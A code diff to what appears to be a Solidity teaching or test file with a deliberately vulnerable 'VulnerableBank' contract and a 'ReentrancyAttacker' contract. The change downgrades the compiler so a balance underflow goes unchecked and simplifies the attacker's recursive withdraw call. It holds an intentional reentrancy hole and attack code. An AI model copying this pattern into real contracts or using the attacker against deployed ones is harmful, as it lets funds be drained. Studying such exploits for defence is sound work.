@@ -1,5 +1,8 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.20;
+pragma solidity ^0.7.6;
+pragma abicoder v2;
+
+import "forge-std/console.sol";
 
 contract VulnerableBank {
     mapping(address => uint256) public balances;
@@ -20,7 +23,7 @@ contract VulnerableBank {
         // VULNERABILITY: External call before state update
         (bool success,) = msg.sender.call{ value: _amount }("");
         require(success, "Transfer failed");
-        // Decrease balance
+        // Decrease balance (silent underflow!!!)
         balances[msg.sender] -= _amount;
         // Emit log
         emit Withdrawal(msg.sender, _amount);
@@ -47,12 +50,7 @@ contract ReentrancyAttacker {
 
     receive() external payable {
         if (address(bank).balance >= ATTACK_AMOUNT) {
-            try bank.withdraw(ATTACK_AMOUNT) {
-            // Continue reentrancy
-            }
-                catch {
-                // Stop if withdrawal fails
-            }
+            bank.withdraw(ATTACK_AMOUNT);
         }
     }
 }
